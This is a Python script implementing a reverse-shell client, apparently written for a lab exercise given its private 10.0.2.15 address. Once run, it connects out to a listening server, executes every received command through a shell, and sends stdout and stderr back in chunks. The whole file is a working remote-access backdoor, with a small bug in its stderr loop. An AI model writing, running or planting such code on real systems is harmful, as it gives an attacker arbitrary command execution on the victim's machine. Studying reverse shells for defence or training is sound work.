import socket
import subprocess
import time


class Connection():
    def __init__(self):
        """Initializing a Connection object creates
        a socket with the listening server and then
        opens up a shell for the server-side user
        to send commands to. The shell commands
        generate stdout and stderr character streams,
        which it sends to the server to be printed.
        It is not limited to 1024 character chunks,
        but will continue sending chunks until stdout
        and stderr buffers are emptied out.
        """
        self.initiate_connection()
        self.reverse_shell()

    def initiate_connection(self):
        """Creates a socket object, connects to the
        server at 10.0.2.15 on port 8080.
        """
        self.s = socket.socket(
                               socket.AF_INET,
                               socket.SOCK_STREAM
                               )
        self.s.connect(('10.0.2.15', 8080))

    def reverse_shell(self):
        """Accepts a command, sends stdout or stderr
        back to the server. When stdout and stderr
        are finished, it sends the string "THAT'S
        ALL, F0LKS!!!", then waits for the next
        command.
        """
        while True:
            command = self.s.recv(1024).decode()
            if 'terminate' in command:
                self.s.close()
                break
            else:
                CMD = subprocess.Popen(
                        command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE
                                       )
                stdout_chunk = CMD.stdout.read(1024)
                while stdout_chunk.decode():
                    self.s.send(stdout_chunk)
                    time.sleep(2)
                    stdout_chunk = CMD.stdout.read(1024)
                stderr_chunk = CMD.stderr.read(1024)

                while stderr_chunk.decode():
                    self.s.send(stderr_chunk)
                    time.sleep(2)
                    stderr_chunk = CMD.stdout.read(1024)
                self.s.send(
                        "THAT'S ALL, F0LKS!!!\n".encode()
                            )


if __name__ == "__main__":
    connection = Connection()
